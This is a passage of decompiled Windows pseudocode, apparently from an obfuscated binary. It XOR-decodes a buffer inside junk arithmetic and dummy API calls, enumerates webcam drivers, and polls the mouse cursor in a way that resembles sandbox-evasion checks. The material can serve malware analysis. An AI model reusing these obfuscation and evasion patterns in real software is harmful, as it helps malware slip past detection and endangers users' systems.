TimeZoneInformation.StandardDate.wDay = 5;\n      TimeZoneInformation.StandardDate.wHour = 2;\n      sub_35945F50(TimeZoneInformation.DaylightName, 32, v431);\n      TimeZoneInformation.DaylightDate.wMonth = 4;\n      TimeZoneInformation.DaylightDate.wDayOfWeek = 0;\n      TimeZoneInformation.DaylightDate.wDay = 1;\n      TimeZoneInformation.DaylightDate.wHour = 2;\n      TimeZoneInformation.DaylightBias = -60;\n      if ( hInternet )\n        v352[8] = SetTimeZoneInformation(&TimeZoneInformation);\n      v226 = (HWND)InternetCloseHandle(hInternet);\n      if ( dword_35BD33E0 > TimeZoneInformation.StandardDate.wMinute )\n      {\n        v80 = dword_358FD894;\n        if ( v226 == dword_358FD894 )\n          v80 = (HWND)((char *)hInternet + 1);\n        for ( kk = 0; kk < v178; ++kk )\n        {\n          v47 = *((_BYTE *)v91 + kk);\n          v60 += v62 * v62 - 32 * (_DWORD)v80;\n          if ( (int)(nIDButton - nIndex) > dword_35BD33D8 )\n            v132 = (v352[10] - nIDButton) * (nIndex + v421 + 1);\n          v79 = (int)v80 + v97 + v62 * v60 + (1 - (_DWORD)hInternet) * (v60 / 2) - 1;\n          HIA0FA(v65) = v79 ^ v47;\n          v66 = v79 ^ v47;\n          v67 = (char)v91;\n          if ( dword_35BD33E0 )\n          {\n            if ( v97 )\n              *((_BYTE *)v91 + kk) = v66;\n            else\n              *((_BYTE *)v91 + kk) = v67;\n          }\n          phProv[0] = 0;\n          if ( hInternet )\n          {\n            if ( CryptAcquireContextA(phProv, 0, 0, 1u, 0xF06FF300) )\n              v132 += nIndex + nIDButton;\n            else\n              v180 += v354;\n          }\n          FileAttributesW = GetFileAttributesW((LP1C67R)FileName);\n          if ( (FileAttributesW & 0x10) == 0 )\n            UpdateWindow(dword_358FD894);\n          v60 -= (_DWORD)v80 * v79 * v97 * v62 + 4 * v79;\n          if ( DestroyWindow(dword_358FD894) )\n            nIndex += v422;\n          if ( dword_358FD894 )\n            MessageBoxW(0, (LP1C67R)FileName, (LP1C67R)FileName, 0);\n          if ( dword_35BD33D8 )\n            v62 += ((_DWORD)hInternet + 1) * (v79 * v79 - v60) + (_DWORD)v80 * 48 * v62;\n        }\n      }\n      v44 = (HM905FE)((char *)hModule + 2 * v43 + (_DWORD)v44);\n      ++v367;\n    }\n    while ( v367 != v64 );\n  }\n  if ( (int)::hDlg * (int)h < ::hDC + 3 )\n  {\n    v46 += nIndex * ((_DWORD)::hDlg + ::hDC * nIDButton);\n    *(_DWORD *)((char *)dword_35BD33EC + 1) = &hModule;\n    EndPaint(v107, &Paint);\n    DefWindowProcA(v107, v188, v186, v184);\n  }\n  else\n  {\n    v20 = wsprintfA(String, \"%d\", psizl.cy);\n    TextOutA(v37, 100, 20, String, v20);\n    dword_358FD868 = ((unsigned int)v44 + v43 - nIDButton) / (::hDC + 1);\n  }\n  v443 = -1;\n  sub_35CCA5B0(v176);\n  dword_3536FFD8 -= nIndex - dword_353E0F18 - (_DWORD)hInternet * nIDButton;\n  dword_353E0F20[0] = (int)\"Bower picturing Eurpeans crucifixion \";\n  dword_3536FFDC -= (int)&TableName[dword_35BD33DC * nIndex - dword_358FD858 - dword_3536FFDC];\n  if ( ::hDC )\n  {\n    v283 = ::hDlg;\n    v340 = nIndex;\n    v285 = 0;\n    v426 = 60;\n    v342 = 0;\n    v287 = ::hDC;\n    v344 = dword_358FD860 + 1;\n    v289 = (int)nIDDlgItem + dword_358FD868;\n    v346 = nIDButton - nIndex;\n    v48 = ::hDlg;\n    v190 = nIDButton;\n    v112 = (unsigned __int16)nIDDlgItem;\n    LO1354(v105) = dword_358FD868;\n    GetClientRect(::hDlg, &Rect);\n    if ( v190 == 276 )\n    {\n      nBar = 0;\n      v111 = Rect.right - Rect.left;\n    }\n    else\n    {\n      nBar = 1;\n      v111 = Rect.bottom - Rect.top;\n    }\n    if ( !v109 )\n      v109 = 1;\n    nPos = GetScrollPos(v48, nBar);\n    GetScrollRange(v48, nBar, &MinPos, &MaxPos);\n    v134 = (unsigned __int16)v105;\n    switch ( (__int16)v105 )\n    {\n      case 0:\n        v36 = -v109;\n        break;\n      case 1:\n        v36 = v109;\n        break;\n      case 2:\n        v36 = -v111;\n        break;\n      case 3:\n        v36 = v111;\n        break;\n      case 4:\n        v36 = v112 - nPos;\n        break;\n      default:\n        v36 = 0;\n        break;\n    }\n    if ( v36 )\n    {\n      nPosa = v36 + nPos;\n      if ( nPosa < MinPos )\n      {\n        v36 -= nPosa - MinPos;\n        nPosa = MinPos;\n      }\n      if ( nPosa > MaxPos )\n      {\n        v36 -= nPosa - MaxPos;\n        nPosa = MaxPos;\n      }\n      if ( v36 )\n      {\n        SetScrollPos(v48, nBar, nPosa, 1);\n        if ( nBar )\n          ScrollWindow(v48, 0, -v36, 0, 0);\n        else\n          ScrollWindow(v48, -v36, 0, 0, 0);\n        UpdateWindow(v48);\n      }\n    }\n    for ( wDriverIndex = 0; (int)wDriverIndex < 10; ++wDriverIndex )\n      capGetDriverDescriptionA(wDriverIndex, szName, 80, szVer, 80);\n    v42 = dword_358FD894;\n    v75 = ::hDC;\n    v142 = nIDButton;\n    v140 = nIndex;\n    v136 = 0;\n    if ( (unsigned int)::hDC > 0x400 )\n      v136 = v75 < 0x7FFF;\n    v50 = v75;\n    if ( v75 > 0xE )\n    {\n      if ( v50 == 15 )\n      {\n        v192 = BeginPaint(dword_358FD894, &v425);\n        GetClientRect(v42, &v419);\n        Rectangle(v192, 0, 0, v419.right, v419.bottom);\n        EndPaint(v42, &v425);\n        goto LABEL_223;\n      }\n      if ( v50 != 513 )\n        goto LABEL_223;\n    }\n    else\n    {\n      if ( v50 >= 0xC )\n      {\n        v136 = 1;\n        goto LABEL_223;\n      }\n      if ( v50 == 1 )\n      {\n        v49 = 35;\n        hDC = GetDC(dword_358FD894);\n        GetTextExtentPoint32A(hDC, &v49, 1, &::psizl);\n        ReleaseDC(v42, hDC);\n        SendMessageA(v291[1], 0xCCu, 0x23u, 0);\n        goto LABEL_223;\n      }\n      if ( v50 == 5 )\n      {\n        fltIn = ::psizl.cy;\n        v29 = ::psizl.cx / 2;\n        v28 = (int)(2 * ((unsigned int)GetDialogBaseUnits() >> 16)) / 8;\n        v27 = 2 * (unsigned __int16)GetDialogBaseUnits() / 4;\n        DlgItem = GetDlgItem(v42, 1);\n        MoveWindow(DlgItem, v27, v28, v29, fltIn, 1);\n        goto LABEL_223;\n      }\n      if ( v50 != 7 )\n      {\nLABEL_223:\n        fltIn_4 = v140;\n        fltIna = v142;\n        v30 = v75;\n        v23 = GetDlgItem(v42, 1);\n        SendMessageA(v23, v30, fltIna, fltIn_4);\n        DefWindowProcA(v42, v75, v142, v140);\n        v194 = nIDButton;\n        v24 = 4 * nIDButton;\n        nIDDlgItem = (HDC)(v24 / (unsigned __int16)GetDialogBaseUnits());\n        v196 = nIndex;\n        v25 = 8 * nIndex;\n        dword_358FD868 = v25 / (unsigned __int16)((unsigned int)GetDialogBaseUnits() >> 16);\n        uID = nIDButton;\n        if ( !LoadStringA(0, nIDButton, &::Buffer, 254) )\n        {\n          v144 = 0;\n          ::Buffer = 0;\n        }\n        goto LABEL_225;\n      }\n    }\n    v22 = GetDlgItem(dword_358FD894, 1);\n    SetFocus(v22);\n    goto LABEL_223;\n  }\nLABEL_225:\n  if ( (_DWORD)hInternet * dword_353E0F08 )\n    dword_35BD33DC = dword_358FD868 + nIDButton;\n  else\n    dword_35BD33DC -= dword_353E0F0C;\n  if ( (unsigned __int16)dword_35BD33F4 + dword_35BD33DC / (dword_35BD33E0 + 62) )\n    dword_35BD33DC += (_DWORD)hMenu * dword_35BD33F4 * dword_358FD868;\n  v206 = 0;\n  v348 = 1;\n  v77 = 0;\n  v202 = hModule;\n  v146 = 0;\n  v53 = 1;\n  v281[5] = 1;\n  v350 = 0;\n  memset(v432, 0, sizeof(v432));\n  v386 = 0;\n  v387 = 0;\n  v388 = 0;\n  v389 = 0;\n  v394 = 0;\n  v395 = 0;\n  v396 = 0;\n  v397 = 0;\n  v398 = 0;\n  v399 = 0;\n  v400 = 0;\n  v401 = 0;\n  memset(&v438[260], 0, 520);\n  sub_3519FC20(v124);\n  v443 = 7;\n  v200 = v77;\n  sub_35D6D300((void ****)v124, &v200);\n  if ( v432 - (_BYTE *)hInternet >= nIDButton * (unsigned int)v202 )\n    v77 += (int)v432 / 26 - (unsigned __int16)TableName;\n  v53 -= (unsigned int)::hDlg + nIndex * dword_35BD33F0 * (v77 / ((unsigned int)::hDlg + 87));\n  sub_3519FC60((void ***)v124, &dword_353E0F18);\n  v204 = dword_358FD894;\n  sub_3519FC60((void ***)v124, &v204);\n  if ( v389 )\n    nIDDlgItem = (HDC)((char *)nIDDlgItem\n                     + (unsigned __int8)v206\n                     + (unsigned __int8)nIDButton / 10\n                     + dword_358FD868 / 27\n                     - v401\n                     - (unsigned __int16)hMenu);\n  else\n    v389 = dword_35BD33D8 + nIDButton - v395 / 39 - (unsigned __int16)dword_353E0F18;\n  sub_3519FCD0(v124, v352);\n  sub_35D6D380((int **)v124);\n  v117 = (int)::hDlg + 10;\n  v95 = 0;\n  v119 = 0;\n  v130.x = 0;\n  v130.y = 0;\n  v128.x = 0;\n  v128.y = 0;\n  EventA = CreateEventA(0, 0, 0, \"x\");\n  if ( (_BYTE)v53 )\n    dword_358FD868 = (unsigned __int8)dword_358FD858\n                   + dword_35BD33D4\n                   + (int)dword_358FD894 / 34\n                   - dword_35BD33F0\n                   - (unsigned __int8)::hDlg;\n  else\n    dword_358FD868 = (unsigned __int8)dword_358FD868;\n  GetCursorPos(&v130);\n  while ( v117-- )\n  {\n    if ( (unsigned __int8)::hDlg <= (int)nIDDlgItem )\n      dword_358FD868 = (unsigned __int16)TableName + v397 - v146;\n    else\n      v399 = v146 + dword_35BD33F0 + (_DWORD)hInternet * dword_35BD33D8;\n    GetCursorPos(&v128);\n    v209[1] = (int)::hDlg;\n    SendMessageA(::hDlg, 0x1307u, 0, (LP3F5C)v364);\n    if ( v130.x == v128.x && v130.y == v128.y )\n    {\n      v148 = 0;\n      WindowDC = GetWindowDC(0);\n      v349 = 24;\n      GetWindowRect(v148, &v423);\n    }\n    else\n    {\n      pvTypePara[1] = (int)dword_358FD894;\n      v130 = v128;\n      SetActiveWindow(dword_358FD894);\n      ++v95;\n    }\n    if ( dword_35BD33D4 * (unsigned __int16)dword_358FD868 / 37 + dword_358FD858 / (int)(hMenu + 15) >= (unsigned __int8)nIndex )\n      nIndex = (unsigned __int16)::hDlg;\n    if ( v95 )\n    {\n      Points.x = 0;\n      Points.y = 0;\n      pvTypePara[3] = 0;\n      ++v119;\n      MapWindowPoints(0, 0, &Points, 1u);\n    }\n    nIDButton -= dword_35BD33E0\n               + (_BYTE *)hInternet\n               + v53\n               + (unsigned __int16)&pszPath\n               + (_DWORD)::hDlg * dword_358FD864\n               - (_BYTE *)dword_358FD894;\n    if ( v95 > 1 )\n    {\n      GetSysColorBrush(5);\n      v150 = dword_35BD33E4;\n      v290 = (double)(unsigned int)dword_35BD33E4;\n      v292 = floor((double)(unsigned int)dword_35BD33E4);\n      v152 = v53 / 0x1F;\n      nIDDlgItem = (HDC)(int)((double)(int)nIDDlgItem\n                            + v292\n                            - (double)(unsigned __int16)::hDlg\n                            + (double)(v53 / 0x1F)\n                            - (double)dword_353E0F18);\n      DrawIcon((HDC)::hDC, 0, 0, (HICON)nIDButton);\n      break;\n    }\n    Format[0] = ::hDC;\n    memset(&Format[1], 0, 0x103u);\n    if ( v119 == 5 )\n      break;\n    sub_35945FB0(Buffer, 1024, Format, ArgList);\n    WaitForSingleObject(EventA, 0xBB7u);\n  }\n  if ( (unsigned __int8)v77 - (unsigned __int16)nIDButton > (unsigned __int16)hInternet - (int)::hDlg )\n    v53 -= (unsigned int)hInternet - dword_35BD33D8;\n  v443 = -1;\n  sub_3519FCA0(v124);\n  if ( (HDC)(dword_35B29748 / 32) == nIDDlgItem )\n    dword_35BD33F4 = (int)hMenu\n                   + dword_358FD868\n                   + dword_35BD33E0\n                   + dword_35BD33F4 / (dword_353E0F18 + 71)\n                   - (_DWORD)nIDDlgItem;\n  else\n    dword_358FD868 += dword_35BD33E0 * dword_35BD33F0;\n  return 0;\n}\n// 35C5F388: using guessed type void __noreturn __report_rangecheckfailure(void);\n// 351D1AA0: using guessed type __m128 _libm_sse2_asin_precise(void);\n// 353372F0: using guessed type __m128 _libm_sse2_cos_precise(void);\n// 35491DB0: using guessed type __m128 _libm_sse2_exp_precise(void);\n// 35422280: using guessed type __m128 _libm_sse2_log10_precise(void);\n// 35E25F30: using guessed type __m128 _libm_sse2_log_precise(void);\n// 35F158C0: using guessed type __m128 _libm_sse2_sin_precise(void);\n// 35DEE490: using guessed type __m128 _libm_sse2_sqrt_precise(void);\n// 35EEE328: using guessed type _BYTE byte_35EEE328[1868];\n// 352583D0: using guessed type __int128 xmmword_352583D0;\n// 35B29748: using guessed type int dword_35B29748;\n// 35AD31BC: using guessed type int dword_35AD31BC;\n// 35AD31C0: using guessed type int dword_35AD31C0;\n// 35AD31C4: using guessed type int dword_35AD31C4;\n// 35AD31C8: using guessed type int dword_35AD31C8;\n// 3536FFCC: using guessed type int dword_3536FFCC;\n// 3536FFD0: using guessed type int dword_3536FFD0;\n// 3536FFD8: using guessed type int dword_3536FFD8;\n// 3536FFDC: using guessed type int dword_3536FFDC;\n// 35BD33D4: using guessed type int dword_35BD33D4;\n// 35BD33D8: using guessed type int dword_35BD33D8;\n// 35BD33DC: using guessed type int dword_35BD33DC;\n// 35BD33E0: using guessed type int dword_35BD33E0;\n// 35BD33E4: using guessed type int dword_35BD33E4;\n// 35BD33EC: using guessed type int (*dword_35BD33EC)(void);\n// 35BD33F0: using guessed type int dword_35BD33F0;\n// 35BD33F4: using guessed type int dword_35BD33F4;\n// 353E0F08: using guessed type int dword_353E0F08;\n// 353E0F0C: using guessed type int dword_353E0F0C;\n// 353E0F18: using guessed type int dword_353E0F18;\n// 353E0F20: using guessed type int dword_353E0F20[78];\n// 358FD858: using guessed type int dword_358FD858;\n// 358FD860: using guessed type int dword_358FD860;\n// 358FD864: using guessed type int dword_358FD864;\n// 35CAEB50: using guessed type SQ805BR szConnStrOut[264];\n// 35CAEB50: using guessed type int var_1D94[3];\n// 35CAEB50: using guessed type char var_1DC4[8];\n// 35CAEB50: using guessed type char var_1DA4[12];\n// 35CAEB50: using guessed type char var_1DAC[8];\n// 35CAEB50: using guessed type char pBuffer[8];\n// 35CAEB50: using guessed type int var_1D88[3];\n// 35CAEB50: using guessed type CHAR szVer[80];\n// 35CAEB50: using guessed type CHAR szName[80];\n// 35CAEB50: using guessed type LP3F5C var_1D68[7];\n// 35CAEB50: using guessed type char Buffer[1028];\n\n"
    }
]